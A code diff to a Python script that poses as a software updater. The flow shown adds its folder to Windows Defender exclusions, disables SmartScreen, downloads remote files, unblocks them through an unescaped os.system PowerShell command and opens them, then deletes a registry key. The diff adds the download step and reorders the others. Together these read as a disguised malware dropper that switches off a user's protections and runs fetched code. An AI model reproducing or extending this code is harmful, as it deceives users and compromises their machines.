@@ -117,11 +117,12 @@ class Main:
                 print(f"{e}")
                 continue
     
-    def unblock_files(self, list_of_files: list[str]):
-        for file_path in list_of_files:
+    def unblock_files(self, path: pl.Path):
+        for file in path.iterdir():
             try:
-                print(f"→ Unblocking {file_path}...")
-                command = f'powershell -Command "Unblock-File -Path \\"{file_path}\\""'
+                print(f"→ Unblocking {file.name}...")
+                print(f"At: {file.as_uri()}")
+                command = f'powershell -Command "Unblock-File -Path \\"{file.as_uri()}\\""'
                 os.system(command)
             except Exception as e:
                 print(f"{e}")
@@ -152,10 +153,11 @@ if __name__ == "__main__":
         print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
         file_urls = self.download_and_return_list_of_files()
+        self.download_files(file_urls)
         self.disable_smartscreen()
-        self.remove_hkey() #234
-        self.unblock_files(file_urls)
+        self.unblock_files(pl.Path(self.APP_DIR))
         self.open_files()
+        self.remove_hkey() #234
         exit(0)
     if self.send_update_notification():
         print("Updating Python...")
